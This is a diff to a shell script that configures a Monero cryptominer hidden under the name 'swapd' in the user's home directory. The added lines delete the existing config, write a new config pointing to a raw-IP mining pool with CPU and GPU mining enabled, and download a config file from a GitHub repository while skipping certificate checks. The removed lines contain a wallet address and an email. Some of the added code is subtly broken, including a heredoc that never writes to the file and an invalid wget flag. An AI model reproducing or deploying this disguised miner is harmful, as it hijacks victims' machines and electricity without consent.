@@ -240,29 +240,21 @@ sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.sw
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
 sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
 
-#rm $HOME/.swapd/config.json
+rm $HOME/.swapd/config.json
 
-#cat $HOME/.swapd/config.json <<EOL
-#{
-#    "autosave": true,
-#    "background": false,
-#    "cpu": true,
-#    "opencl": true,
-#    "cuda": true,
-#    "pools": [
-#        {
-#            "coin": "monero",
-#            "algo": null,
-#            "url": "gulf.moneroocean.stream:10128",
-#            "user": "4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX",
-#            "pass": "littlAcen@24-mail.com",
-#            "tls": false,
-#            "keepalive": true,
-#            "nicehash": false
-#        }
-#    ]
-#}
-#EOL
+cat $HOME/.swapd/config.json <<EOL
+{
+    "autosave": true,
+    "cpu": true,
+    "opencl": true,
+    "cuda": true,
+    "pools": [
+        {
+            "url": "194.164.63.118:3333"
+        }
+    ]
+}
+EOL
 
 wget --no-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
 
